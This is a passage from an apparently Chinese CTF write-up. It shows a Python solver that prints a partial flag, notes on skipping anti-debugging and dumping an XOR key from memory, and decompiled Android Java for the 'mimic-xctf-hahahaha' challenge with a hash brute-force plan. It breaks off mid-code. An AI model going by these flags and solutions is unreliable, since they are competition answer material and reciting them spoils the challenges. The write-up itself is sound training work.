class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(int6_4byte)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            int6_4byte[ind] = base64table.index(int6_4byte[ind])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            int6_4byte[ind] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        o_int6_4bytes[i] = (int6_4byte[i] &amp; <span class="number">0x38</span>) | ((int6_4byte[i] ^ (int6_4byte[i] &gt;&gt; <span class="number">3</span>)) &amp; <span class="number">0x7</span> )</span><br><span class="line">    o_3bytes = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    o_3bytes[<span class="number">0</span>] = ((o_int6_4bytes[<span class="number">0</span>] &lt;&lt; <span class="number">2</span>) | (o_int6_4bytes[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    o_3bytes[<span class="number">1</span>] = ((o_int6_4bytes[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) | (o_int6_4bytes[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    o_3bytes[<span class="number">2</span>] = ((o_int6_4bytes[<span class="number">2</span>] &lt;&lt; <span class="number">6</span>) | (o_int6_4bytes[<span class="number">3</span>] )) &amp; <span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># printHexInList(int6_4byte)</span></span><br><span class="line">    <span class="comment"># printHexInList(o_int6_4bytes)</span></span><br><span class="line">    <span class="comment"># printHexInList(o_3bytes)</span></span><br><span class="line">    <span class="comment"># print(&#x27;---------&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> o_3bytes</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;e25be952&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>,<span class="number">4</span>):</span><br><span class="line">    g = guess3Bytes(base64Bytes[ind: ind+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(g[<span class="number">0</span>])+<span class="built_in">chr</span>(g[<span class="number">1</span>])+<span class="built_in">chr</span>(g[<span class="number">2</span>]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>一些不足：<br>没有对反调试代码逻辑进行细致的梳理，想着是能过就好。<br>xor_key在bss段，在程序运行过程中生成，没有梳理生成算法，动态调试连过去直接dump内存得到的。</p><h1 id="mimic-xctf-hahahaha"><a href="#mimic-xctf-hahahaha" class="headerlink" title="mimic-xctf-hahahaha"></a>mimic-xctf-hahahaha</h1><blockquote><p>强网杯 “拟态”比赛 mobile1</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">clip0: 5f384050   -&gt; 5fb84050</span><br><span class="line">clip_i_hash: fc7466e55fbf37b1</span><br><span class="line">clip1: 35315f48  -&gt; b531df48</span><br><span class="line">clip_i_hash: 78b0be39e63b6837</span><br><span class="line">clip2: 7d503131 -&gt;  fdd0b1b1 (rndKeyi=15</span><br><span class="line">clip_i_hash: c2f9c805d0442203</span><br><span class="line">clip3: 7b484035  -&gt; 7b4840b5</span><br><span class="line">clip_i_hash: c11a61bb60d79dab</span><br><span class="line">clip4: 435f3535 -&gt; c3dfb535</span><br><span class="line">clip_i_hash: 869e650ee55bd9f6</span><br><span class="line">clip5: 50314e33  -&gt; 50b14eb3</span><br><span class="line">clip_i_hash: f2dda5fc021fe2bf</span><br><span class="line">clip6: 3348375f -&gt;  b348b7df (rndKeyi=11</span><br><span class="line">clip_i_hash: 305044db48fe6174</span><br><span class="line">clip7: 47414c46 -&gt;  c7414c46 (rndKeyi=8</span><br><span class="line">clip_i_hash: d6659b5e2d1059f8</span><br></pre></td></tr></table></figure><p>该题先检查输入是否满足要求，然后基于输入数据生成flag。不过检查逻辑都是基于hash的，所以不能解密得到原文。<br>不过输入的8段数据(8个clip)的检查是相互独立的，所以可以考虑爆破。</p><p>接下来分析程序逻辑：</p><ol><li><p>密钥准备：<br>在<code>WelcomeActivity</code>中，先生成了相关密钥和hash值。<br><code>a.SpecBytesMat</code>是后续计算hash时用到的初始向量矩阵，实际的值是原来值的MD5。<br><code>a.rndKey</code>用于选择hash计算的函数，实际的值是原来值抑或<code>0xAB</code>。<br><code>a.clips_i_hash_mat</code>是8个hash值，也是输入的8个clip的hash值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">a.SpecBytesMat = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;<span class="string">&quot;WIgD1ZNZ0ilJqFpw&quot;</span>.getBytes(), <span class="string">&quot;4811tjOZjoiXpjdq&quot;</span>.getBytes(), <span class="string">&quot;ALFjcgztxnUaC89v&quot;</span>.getBytes(), <span class="string">&quot;ZgHzTu79Zwhoi0PB&quot;</span>.getBytes(), <span class="string">&quot;UYBfajKYrDFE1zJs&quot;</span>.getBytes(), <span class="string">&quot;yr4PBIjlJg89FpP3&quot;</span>.getBytes(), <span class="string">&quot;SFHqaTYDf7EeEevX&quot;</span>.getBytes(), <span class="string">&quot;gUwrqaE3nCxKr4Du&quot;</span>.getBytes()&#125;;</span><br><span class="line">a.rndKeys = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0xAF</span>, <span class="number">0xA1</span>, <span class="number">0xA4</span>, <span class="number">170</span>, <span class="number">0xA5</span>, <span class="number">0xAE</span>, <span class="number">0xA0</span>, <span class="number">0xA3</span>&#125;;  <span class="comment">//  (xor 0xAB) -&gt; &#123;0x4,0xa,0xf,0x1,0xe,0x5,0xb,0x8&#125;</span></span><br><span class="line">a.clips_i_hash_mat = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;fc7466e55fbf37b1&quot;</span>, <span class="string">&quot;78b0be39e63b6837&quot;</span>, <span class="string">&quot;c2f9c805d0442203&quot;</span>, <span class="string">&quot;c11a61bb60d79dab&quot;</span>, <span class="string">&quot;869e650ee55bd9f6&quot;</span>, <span class="string">&quot;f2dda5fc021fe2bf&quot;</span>, <span class="string">&quot;305044db48fe6174&quot;</span>, <span class="string">&quot;d6659b5e2d1059f8&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WelcomeActivity</span> <span class="keyword">extends</span> <span class="title">h</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// a.b.c.h</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0B001D</span>);  <span class="comment">// layout:activity_welcome</span></span><br><span class="line">        <span class="keyword">int</span> ind2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ind1;  <span class="comment">// xor 0xAB</span></span><br><span class="line">        <span class="keyword">for</span>(ind1 = <span class="number">0</span>; <span class="keyword">true</span>; ++ind1) &#123;  <span class="comment">// xor 0xAB</span></span><br><span class="line">            <span class="keyword">int</span>[] v1 = a.rndKeys;</span><br><span class="line">            <span class="keyword">if</span>(ind1 &gt;= v1.length) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v1[ind1] ^= <span class="number">0xAB</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ind2 &lt; a.SpecBytesMat.length) &#123;</span><br><span class="line">            MessageDigest MD5 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MD5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v1_1) &#123;</span><br><span class="line">                v1_1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            MD5.update(a.SpecBytesMat[ind2]);</span><br><span class="line">            a.SpecBytesMat[ind2] = MD5.digest();</span><br><span class="line">            ++ind2;  <span class="comment">// Loop MD5 to bytesMat(iteratively)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F080088</span>).setOnClickListener(<span class="keyword">new</span> WelcomeActivity.click2MainActivity(<span class="keyword">this</span>));  <span class="comment">// id:go_btn</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输入格式检查<br>先获取输入的8段字符串，然后进行检查。<br>字符串需要是16进制字符串。（不带<code>0x</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">clipsi[<span class="number">0</span>] = v1.p;</span><br><span class="line">clipsi[<span class="number">1</span>] = v1.q;</span><br><span class="line">clipsi[<span class="number">2</span>] = v1.r;</span><br><span class="line">clipsi[<span class="number">3</span>] = v1.s;</span><br><span class="line">clipsi[<span class="number">4</span>] = v1.t;</span><br><span class="line">clipsi[<span class="number">5</span>] = v1.u;</span><br><span class="line">clipsi[<span class="number">6</span>] = v1.v;</span><br><span class="line">clipsi[<span class="number">7</span>] = v1.w;</span><br><span class="line">String[] clips = <span class="keyword">new</span> String[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span> v6 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v7;</span><br><span class="line"><span class="keyword">for</span>(v7 = <span class="number">0</span>; v6 &lt; <span class="number">8</span>; ++v7) &#123;</span><br><span class="line">    String v8 = clipsi[v6].getText().toString();  <span class="comment">// 要求输入8x8个字符</span></span><br><span class="line">    <span class="keyword">if</span>(v8.length() != <span class="number">8</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;clips must be enough, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clips[v7] = v8;</span><br><span class="line">    ++v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] clips_i_bytes = a.hex2Bytes(clips[ind]);  <span class="comment">// format check 8位16进制字符串</span></span><br><span class="line">    <span class="keyword">if</span>(clips_i_bytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;clips format error, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            clipsi[ind].setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            ++ind;  <span class="comment">// clean clips</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hex2Bytes(String arg6) &#123;</span><br><span class="line">    <span class="keyword">int</span> lens = arg6.length();</span><br><span class="line">    <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[lens / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ind &lt; lens) &#123;</span><br><span class="line">        <span class="keyword">int</span> v3 = Character.digit(arg6.charAt(ind), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> v4 = Character.digit(arg6.charAt(ind + <span class="number">1</span>), <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(v3 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            v1[ind / <span class="number">2</span>] = (<span class="keyword">byte</span>)(v3 + v4);</span><br><span class="line">            ind += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>格式转换与校验<br>既然每个clip是8位的16进制字符串，那么它等价于4个byte，也即一个<code>int32</code>。<br>于是先转换为4个byte，然后把4个byte的最高位提出来构造为一个<code>int4</code>记作<code>rndKey</code>，然后4个byte只保留剩余的7位记作<code>clips_i_bytes</code>。<br>设当前检查的是第<code>i</code>个clip。<br>接着，调用一个自定义的hash计算函数，要求<code>hash(rndKey, clips_i_bytes)=hash(a.rndKeys[i], clips_i_bytes)=a.clip_i_hash_mat[i]</code>。<br>hash内部是一个更为烧脑的计算逻辑，输入的<code>rndKey</code>会用来选择hash计算算法，输入的<code>clips_i_bytes</code>是hash的原文，如果<code>rndKey&gt;7</code>，会调用<code>a.SpecBytesMat</code>作为hash计算的盐。<br>不过，考虑到hash计算的特性，在<code>rndKey!=a.rndKeys[i]</code>的情况下，<code>hash(rndKey, clips_i_bytes)=hash(a.rndKeys[i], clips_i_bytes)</code>的概率极小，所以不妨直接设定<code>rndKey=a.rndKeys[i]</code>,由于a.rndKeys[i]已知，且rndKey来自于输入的clip，所以这下就确定了4个bit。<br>接下来就是枚举剩余的28个bit，使得<code>hash(a.rndKeys[i], clips_i_bytes)=a.clip_i_hash_mat[i]</code>。（代码见最后）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] clips_i_bytes = a.hex2Bytes(clips[ind]);  <span class="comment">// format check 8位16进制字符串</span></span><br><span class="line">    <span class="keyword">if</span>(clips_i_bytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;clips format error, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            clipsi[ind].setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            ++ind;  <span class="comment">// clean clips</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ind3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rndKey = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ind3 &lt; clips_i_bytes.length) &#123;</span><br><span class="line">        rndKey = rndKey &lt;&lt; <span class="number">1</span> | (clips_i_bytes[ind3] &amp; <span class="number">0x80</span>) &gt;&gt;&gt; <span class="number">7</span>;  <span class="comment">// rndKey 是8个byte的最高位组合</span></span><br><span class="line">        clips_i_bytes[ind3] = (<span class="keyword">byte</span>)(clips_i_bytes[ind3] &amp; <span class="number">0x7F</span>);  <span class="comment">// clips_i_bytes 只保留7位,刚好保证在ASCII范围内</span></span><br><span class="line">        ++ind3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String clips_i_hash = a.hash_int_string_add0_0_16(rndKey, clips_i_bytes);  <span class="comment">// rndKeys[ind] == rndKey</span></span><br><span class="line">    <span class="keyword">if</span>(clips_i_hash != <span class="keyword">null</span> </span><br><span class="line">       &amp;&amp; (clips_i_hash.equals(a.hash_int_string_add0_0_16(a.rndKeys[ind], clips_i_bytes))) </span><br><span class="line">       &amp;&amp; (clips_i_hash.equals(a.clips_i_hash_mat[ind]))) </span><br><span class="line">    &#123;</span><br><span class="line">        ++ind;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;your clip is not suitable, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    <span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        clipsi[ind].setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        ++ind;  <span class="comment">// clean clips</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hash_int_string_add0_0_16</span><span class="params">(<span class="keyword">int</span> argRndKey, <span class="keyword">byte</span>[] argBytes)</span> </span>&#123;</span><br><span class="line">    String v0_1;</span><br><span class="line">    <span class="keyword">byte</span>[] argBytes1 = argBytes;</span><br><span class="line">    <span class="keyword">if</span>((argRndKey &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(argRndKey &amp; <span class="number">7</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">4</span>]);</span><br><span class="line">        <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">5</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">6</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line">                v0_1 = a.SHA512_int_String_add0(argBytes1, a.SpecBytesMat[<span class="number">7</span>]);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v1 = argRndKey &amp; <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span>(v1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_11 = MessageDigest.getInstance(<span class="string">&quot;MD2&quot;</span>);</span><br><span class="line">                v1_11.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_13 = v1_11.digest();</span><br><span class="line">                <span class="keyword">char</span>[] v1_12 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span 